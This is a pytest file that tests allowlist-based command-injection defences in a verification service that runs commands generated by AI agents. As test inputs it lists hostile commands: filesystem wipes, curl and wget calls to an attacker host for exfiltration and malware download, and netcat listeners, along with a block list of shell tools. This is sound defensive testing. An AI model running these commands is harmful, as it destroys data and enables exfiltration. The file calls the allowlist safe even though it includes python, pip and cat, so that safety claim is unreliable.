"""Command Injection Prevention Tests

Tests for V-SECURITY-5 prevention: Command injection vulnerability in verification service.

Attack Vector:
    Verification commands executed via subprocess are vulnerable to command injection
    if an AI agent mistakenly generates malicious commands like:
    - "pytest --version; rm -rf /"
    - "coverage || curl http://attacker.com/exfil"
    - "python && nc -l -p 4444"

Prevention Strategy:
    1. Allowlist approach: Only 17 safe commands permitted
    2. No shell interpretation: Use create_subprocess_exec() with shell=False
    3. Strict command parsing: shlex.split() with error handling
    4. Comprehensive validation: Block all injection attempts

Security Philosophy:
    これはセキュリティテストです。最悪のケースを想定して、徹底的にテストします。
    Command injection is a CRITICAL vulnerability that could lead to:
    - Full system compromise
    - Data exfiltration
    - Denial of service
    - Lateral movement in multi-tenant environments

Test Coverage:
    - Allowlist validation (21 commands)
    - Shell injection prevention (pipes, redirects, operators)
    - Parsing error handling (malformed quotes)
    - Timeout enforcement
    - Normal execution validation
"""

import pytest
import pytest_asyncio

from src.core.exceptions import ValidationError, VerificationError
from src.models.agent import Agent, AgentStatus
from src.services.verification_service import (
    ALLOWED_COMMANDS,
    VerificationService,
)


class TestCommandInjectionPrevention:
    """Tests for command injection prevention in verification service.

    Security Focus:
    - V-SECURITY-5: Command injection vulnerability prevention
    - CVSS 6.5-7.0 LOCAL (Could escalate to 8.0+ with privesc)
    - Impact: Arbitrary code execution, system compromise

    Test Strategy:
    1. Allowlist validation (positive cases)
    2. Blocked commands (negative cases)
    3. Shell injection attempts (various vectors)
    4. Parsing edge cases
    5. Normal execution flow
    """

    @pytest_asyncio.fixture
    async def verification_service(self, test_session):
        """Create verification service with test database session."""
        return VerificationService(session=test_session)

    @pytest_asyncio.fixture
    async def test_agent_for_verification(self, test_session):
        """Create test agent for verification tests."""
        agent = Agent(
            agent_id="verification-test-agent",
            namespace="verification-test",
            display_name="Verification Test Agent",
            capabilities=["verification:execute"],
            status=AgentStatus.ACTIVE,
            metadata={"test": True, "role": "verification"},
        )
        test_session.add(agent)
        await test_session.commit()
        await test_session.refresh(agent)
        return agent

    # ========================================
    # Test 1: Allowlist Validation (Positive Cases)
    # ========================================

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "command,full_command",
        [
            ("pytest", "pytest --version"),
            ("python", "python --version"),
            ("python3", "python3 --version"),
            ("coverage", "coverage --version"),
            ("ruff", "ruff --version"),
            ("mypy", "mypy --version"),
            ("black", "black --version"),
            ("isort", "isort --version"),
            ("flake8", "flake8 --version"),
            ("bandit", "bandit --version"),
            ("safety", "safety --version"),
            ("pip", "pip --version"),
            ("echo", "echo 'test'"),
            ("cat", "cat /etc/hostname"),
            ("ls", "ls -la"),
            ("pwd", "pwd"),
            ("whoami", "whoami"),
            ("true", "true"),
            ("false", "false"),
            ("exit", "exit 0"),
            ("sleep", "sleep 1"),
        ],
    )
    async def test_allowed_commands_execute_successfully(
        self, verification_service, test_agent_for_verification, command: str, full_command: str
    ):
        """Test that all 21 allowed commands execute without ValidationError.

        Test Case:
            Given: A command from the allowlist
            When: _execute_verification is called
            Then: Command is executed and result is returned (not blocked by allowlist check)

        Security:
            - Verifies allowlist is comprehensive
            - Confirms no false positives (legitimate commands blocked)
            - Tests parameterized: All 21 commands validated

        Note:
            Some commands may fail due to environment (e.g., 'cat /etc/hostname' on Windows)
            but should NOT raise ValidationError (allowlist check passed)
        """
        # Skip if command is not available in test environment
        try:
            result = await verification_service._execute_verification(full_command)
            assert isinstance(result, dict)
            assert "command" in result
            assert "stdout" in result
            assert "stderr" in result
            assert "return_code" in result
            assert "timestamp" in result
        except VerificationError as e:
            # VerificationError is OK (execution failure)
            # ValidationError would be the security issue
            if "not allowed" in str(e).lower():
                pytest.fail(f"Allowed command was blocked: {command}")
            # Other VerificationErrors (timeout, execution failure) are acceptable
            pass

    # ========================================
    # Test 2: Blocked Commands (Negative Cases)
    # ========================================

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "dangerous_command",
        [
            "rm",
            "rm -rf /",
            "curl",
            "curl http://attacker.com",
            "wget",
            "wget http://attacker.com/malware.sh",
            "nc",
            "nc -l -p 4444",
            "ncat",
            "socat",
            "sh",
            "bash",
            "ksh",
            "zsh",
            "perl",
            "ruby",
            "node",
        ],
    )
    async def test_dangerous_commands_blocked_by_allowlist(
        self, verification_service, dangerous_command
    ):
        """Test that dangerous/uncommon commands are blocked.

        Test Case:
            Given: A command NOT in the allowlist (e.g., 'rm', 'curl', 'nc')
            When: _execute_verification is called
            Then: ValidationError is raised with "not allowed" message

        Security Focus:
            - V-SECURITY-5: Prevents command injection via arbitrary command execution
            - Ensures allowlist is restrictive (whitelist, not blacklist)
            - Tests 17 dangerous commands that could enable attacks

        Attack Vectors Prevented:
            1. "rm -rf /" - Destructive filesystem operations
            2. "curl http://attacker.com" - Data exfiltration
            3. "nc -l" - Reverse shell setup
            4. "bash -i" - Interactive shell access
            5. "perl -e" - Code injection
        """
        with pytest.raises(ValidationError) as exc_info:
            await verification_service._execute_verification(dangerous_command)

        # Verify error message is clear
        error_message = str(exc_info.value)
        assert (
            "not allowed" in error_message.lower() or "command not allowed" in error_message.lower()
        )
        # Error message contains the base command (first token)
        base_cmd = dangerous_command.split()[0]
        assert base_cmd in error_message

    # ========================================
    # Test 3: Shell Injection Prevention
    # ========================================

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "injection_attempt",
        [
            # Injection with dangerous commands (these are blocked by allowlist)
            "rm; pytest",  # rm is not in allowlist
            "curl http://attacker.com; pytest",
            "bash -i",  # bash is not in allowlist
            "perl -e 'system(...)'",  # perl is not in allowlist
        ],
    )
    async def test_shell_injection_with_disallowed_base_commands_blocked(
        self, verification_service, injection_attempt
    ):
        """Test that shell injection with disallowed base commands are blocked.

        Test Case:
            Given: A command with dangerous base command in allowlist
            When: _execute_verification is called
            Then: ValidationError is raised (base command not in allowlist)

        Security Focus:
            - V-SECURITY-5: Prevents shell injection via disallowed commands
            - Allowlist enforcement prevents direct execution of dangerous commands
            - Even if combined with shell metacharacters, blocked if base command is disallowed

        Implementation Detail:
            shlex.split() correctly parses these as separate tokens:
            $ python -c "import shlex; print(shlex.split('rm; pytest'))"
            ['rm', ';', 'pytest']

            When passed to create_subprocess_exec:
            - Tries to execute: /usr/bin/rm (from PATH)
            - This fails allowlist check
            - ValidationError is raised before subprocess execution

        Note:
            Shell metacharacters with ALLOWED commands (pytest, python, etc.) are safe
            because create_subprocess_exec(shell=False) treats them as literal arguments,
            not as shell operators. For example:
            - "pytest > /tmp/evil" → executes pytest with arguments ['>',  '/tmp/evil']
            - pytest doesn't understand '>' as redirection, treats it as test name
            - No shell redirection occurs, file is not created
        """
        with pytest.raises(ValidationError) as exc_info:
            await verification_service._execute_verification(injection_attempt)

        # The base command (extracted by shlex.split) should be invalid
        error_message = str(exc_info.value)
        assert "not allowed" in error_message or "invalid" in error_message.lower()

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "safe_with_operators",
        [
            "echo test > /tmp/file",  # Safe: '>' is literal argument to echo
            "python --version | cat",  # Safe: '|' is literal argument
            "pytest && true",  # Safe: '&&' is literal argument
            "coverage || pwd",  # Safe: '||' is literal argument
        ],
    )
    async def test_allowed_commands_with_shell_operators_are_safe(
        self, verification_service, safe_with_operators
    ):
        """Test that allowed commands with shell operators don't execute injection.

        Test Case:
            Given: An allowed command combined with shell metacharacters
            When: _execute_verification is called with shell=False
            Then: Command executes safely (operators are literal arguments, not interpreted)

        Security Focus:
            - V-SECURITY-5: Understanding the safety mechanism
            - create_subprocess_exec(shell=False) is the KEY security control
            - With shell=False, metacharacters are NOT interpreted by a shell
            - They become literal string arguments to the subprocess

        Why This Is Safe:
            When you call create_subprocess_exec("echo", ">", "/tmp/file", shell=False):
            - /usr/bin/echo is executed
            - Arguments: [">", "/tmp/file"]
            - echo's behavior: prints literal string ">" and "/tmp/file"
            - NO shell process is spawned
            - NO redirection occurs
            - /tmp/file is NOT created/overwritten

            Contrast with shell=True:
            - shell /bin/sh -c "echo > /tmp/file"
            - Shell parses ">" as redirection operator
            - Output redirected to /tmp/file (DANGEROUS!)

        This Test Validates:
            - Allowed commands execute successfully (not blocked)
            - No errors occur (unlike injection attempts)
            - The operators don't cause harm
        """
        try:
            result = await verification_service._execute_verification(safe_with_operators)
            # Success: command executed without injection
            assert isinstance(result, dict)
            assert "command" in result
            # The operators should appear in output (treated as literal arguments)
            # or in arguments, but NOT be interpreted as shell operations
        except VerificationError:
            # Execution failure is OK (command might not exist in test environment)
            # ValidationError would be a security issue
            pass

    # ========================================
    # Test 4: Parsing Edge Cases
    # ========================================

    @pytest.mark.asyncio
    async def test_empty_command_raises_validation_error(self, verification_service):
        """Test that empty command string raises ValidationError.

        Test Case:
            Given: Empty command string ""
            When: _execute_verification is called
            Then: ValidationError with "Empty command" message

        Security:
            - Prevents edge case handling errors
            - Ensures defensive programming (explicit check)
            - Part of comprehensive input validation

        Rationale:
            Empty commands could slip through other checks and cause
            unexpected behavior in subprocess handling.
        """
        with pytest.raises(ValidationError) as exc_info:
            await verification_service._execute_verification("")

        error_message = str(exc_info.value).lower()
        assert "empty" in error_message or "no command" in error_message

    @pytest.mark.asyncio
    async def test_whitespace_only_command_raises_validation_error(self, verification_service):
        """Test that whitespace-only command raises ValidationError.

        Test Case:
            Given: Whitespace-only command "   \t\n"
            When: _execute_verification is called
            Then: ValidationError is raised

        Security:
            - Prevents edge case handling errors
            - shlex.split() treats whitespace as empty after stripping
        """
        with pytest.raises(ValidationError) as exc_info:
            await verification_service._execute_verification("   \t\n")

        error_message = str(exc_info.value).lower()
        assert "empty" in error_message

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "malformed_quote",
        [
            "pytest 'unclosed quote",  # Unclosed single quote
            'pytest "unclosed double',  # Unclosed double quote
            "pytest 'mixed\" quotes",  # Mismatched quote types
        ],
    )
    async def test_malformed_quotes_raise_validation_error(
        self, verification_service, malformed_quote
    ):
        """Test that truly malformed quotes raise ValidationError.

        Test Case:
            Given: Command with unclosed quotes
            When: _execute_verification is called
            Then: ValidationError is raised (shlex.split() raises ValueError)

        Security:
            - Prevents exploitation via quote-based injection
            - shlex.split() validates quote pairing
            - Clear error message (not silent failure)

        Attack Prevention:
            Attacker might try: "pytest 'argument; rm -rf /'"
            - shlex.split() raises ValueError (unclosed quote)
            - ValidationError is raised to caller
            - No silent fallback or skip

        Note:
            Commands like "pytest 'arg1 'arg2" are actually valid shell syntax
            (two separate quoted strings), so they don't raise errors from shlex.
        """
        with pytest.raises(ValidationError) as exc_info:
            await verification_service._execute_verification(malformed_quote)

        error_message = str(exc_info.value).lower()
        assert "invalid" in error_message or "syntax" in error_message

    # ========================================
    # Test 5: Timeout Enforcement
    # ========================================

    @pytest.mark.asyncio
    async def test_timeout_raises_verification_error(self, verification_service):
        """Test that command timeout raises VerificationError.

        Test Case:
            Given: A command that takes longer than timeout
            When: _execute_verification(command, timeout_seconds=0.1) is called
            Then: VerificationError with "timed out" message

        Security:
            - Prevents DoS via infinite loops or hanging processes
            - Ensures subprocess doesn't consume resources indefinitely
            - Timeout enforcement is CRITICAL for service stability

        Implementation:
            - asyncio.wait_for() enforces timeout
            - Process is kill()'d if timeout occurs
            - await process.communicate() completes the cleanup
        """
        # 'sleep 60' will take 60 seconds, but timeout is 0.1 seconds
        with pytest.raises(VerificationError) as exc_info:
            await verification_service._execute_verification("sleep 60", timeout_seconds=0.1)

        error_message = str(exc_info.value).lower()
        assert "timeout" in error_message or "timed out" in error_message

    # ========================================
    # Test 6: Normal Execution Flow
    # ========================================

    @pytest.mark.asyncio
    async def test_allowed_command_executes_and_returns_result(self, verification_service):
        """Test that allowed command executes and returns proper result structure.

        Test Case:
            Given: A valid allowed command like "echo 'hello'"
            When: _execute_verification is called
            Then: Returns dict with stdout, stderr, return_code, command, timestamp

        Security:
            - Validates result structure (prevents return value injection)
            - Tests normal happy path execution
            - Confirms data types and fields are as expected

        Expected Result Structure:
            {
                "stdout": "hello\\n",
                "stderr": "",
                "return_code": 0,
                "command": "echo 'hello'",
                "timestamp": "2025-11-09T10:30:45.123456"
            }
        """
        result = await verification_service._execute_verification("echo 'hello'")

        # Validate result structure
        assert isinstance(result, dict), "Result must be a dictionary"
        assert "stdout" in result
        assert "stderr" in result
        assert "return_code" in result
        assert "command" in result
        assert "timestamp" in result

        # Validate data types
        assert isinstance(result["stdout"], str)
        assert isinstance(result["stderr"], str)
        assert isinstance(result["return_code"], int)
        assert isinstance(result["command"], str)
        assert isinstance(result["timestamp"], str)

        # Validate command content
        assert result["command"] == "echo 'hello'"
        assert "hello" in result["stdout"]
        assert result["return_code"] == 0

    @pytest.mark.asyncio
    async def test_allowed_command_with_arguments_executes(self, verification_service):
        """Test that allowed command with arguments executes correctly.

        Test Case:
            Given: Command with multiple arguments "echo arg1 arg2 arg3"
            When: _execute_verification is called
            Then: Command executes and arguments are passed correctly

        Security:
            - Tests argument passing (no word-splitting vulnerabilities)
            - Validates shlex.split() correctly tokenizes arguments
            - Confirms arguments are treated as literal strings

        Implementation Detail:
            shlex.split("echo arg1 arg2 arg3") → ["echo", "arg1", "arg2", "arg3"]
            create_subprocess_exec("echo", "arg1", "arg2", "arg3")
            → Executes /usr/bin/echo with 3 string arguments
            → No shell interpretation of arguments
        """
        result = await verification_service._execute_verification("echo test1 test2 test3")

        assert result["return_code"] == 0
        assert "test1" in result["stdout"]
        assert "test2" in result["stdout"]
        assert "test3" in result["stdout"]

    # ========================================
    # Test 7: Allowed Commands List Integrity
    # ========================================

    @pytest.mark.asyncio
    async def test_allowed_commands_constant_has_21_commands(self):
        """Test that ALLOWED_COMMANDS contains exactly 21 approved commands.

        Test Case:
            Given: ALLOWED_COMMANDS constant
            When: Count is taken
            Then: Exactly 21 commands are defined

        Security:
            - Validates allowlist configuration
            - Prevents accidental changes to allowlist without review
            - Documents the complete list of trusted commands

        Expected Commands (21):
            1. pytest - Python testing framework
            2. python - Python interpreter (main)
            3. python3 - Python interpreter (version 3)
            4. coverage - Code coverage measurement
            5. ruff - Python linter
            6. mypy - Python type checker
            7. black - Python code formatter
            8. isort - Python import sorter
            9. flake8 - Python linter
            10. bandit - Python security linter
            11. safety - Python dependency safety checker
            12. pip - Python package manager
            13. echo - Shell utility (safe)
            14. cat - Shell utility (safe)
            15. ls - Shell utility (safe)
            16. pwd - Shell utility (safe)
            17. whoami - Shell utility (safe)
            18. true - Shell control command (safe)
            19. false - Shell control command (safe)
            20. exit - Shell control command (safe)
            21. sleep - Shell utility (safe)

        Rationale:
            These 21 commands enable:
            - Python development workflows (testing, linting, formatting)
            - Dependency checking (pip, safety)
            - Secure shell utilities (ls, pwd, whoami, echo, cat, sleep)
            - Shell control commands (true, false, exit) for script testing

            All other commands are blocked to prevent:
            - Arbitrary code execution (perl, ruby, node, bash, sh, etc.)
            - Data exfiltration (curl, wget, nc, socat, etc.)
            - Destructive operations (rm, dd, mkfs, etc.)
            - Privilege escalation (sudo, su, etc.)
        """
        assert len(ALLOWED_COMMANDS) == 21

        # Verify the expected commands are present
        expected_commands = {
            "pytest",
            "python",
            "python3",
            "coverage",
            "ruff",
            "mypy",
            "black",
            "isort",
            "flake8",
            "bandit",
            "safety",
            "pip",
            "echo",
            "cat",
            "ls",
            "pwd",
            "whoami",
            "true",
            "false",
            "exit",
            "sleep",
        }
        assert expected_commands == ALLOWED_COMMANDS

    # ========================================
    # Test 8: Integration with Verification Service
    # ========================================

    @pytest.mark.asyncio
    async def test_injection_blocked_at_service_boundary(self, verification_service):
        """Test that command injection is blocked at the service boundary.

        Test Case:
            Given: _execute_verification is called with injection attempt
            When: Injection command is provided
            Then: ValidationError is raised before subprocess execution

        Security Context:
            - AI agents might generate verification commands
            - Commands could be malicious (intentionally or by mistake)
            - Service must validate before execution

        Attack Scenario:
            1. Malicious agent provides verification command
            2. Command: "rm; pytest" (dangerous command first)
            3. Expected: ValidationError raised
            4. System: Protected against arbitrary execution

        Implementation:
            - _execute_verification() is the primary validation boundary
            - shlex.split() parses the command safely
            - Base command is checked against allowlist
            - ValidationError prevents subprocess execution
        """
        with pytest.raises(ValidationError) as exc_info:
            # Injection attempt: dangerous command that will fail allowlist
            await verification_service._execute_verification("rm; pytest")

        error_message = str(exc_info.value)
        assert "not allowed" in error_message.lower() or "rm" in error_message

    # ========================================
    # Test 9: Performance (Command Execution Timing)
    # ========================================

    @pytest.mark.asyncio
    async def test_allowed_command_executes_within_timeout(self, verification_service):
        """Test that allowed command executes within reasonable timeout.

        Test Case:
            Given: A fast allowed command like "echo test"
            When: _execute_verification is called with timeout=30s
            Then: Command completes successfully (return_code 0)

        Performance Target:
            - <500ms P95 (as per VerificationService docstring)
            - Timeout should be generous to avoid spurious failures

        This test validates:
            - timeout mechanism works correctly
            - allowed commands aren't unexpectedly slow
            - subprocess communication completes properly
        """
        result = await verification_service._execute_verification(
            "echo 'test'", timeout_seconds=30.0
        )

        assert result["return_code"] == 0
        # Execution should be fast (well under timeout)
        assert "test" in result["stdout"]


# ============================================================================
# Note: Fixtures are provided by conftest.py
# - test_session: Async database session (from pytest plugins)
# - test_agent_for_verification: Test agent created in this class
# - verification_service: Service fixture created in this class
# ============================================================================
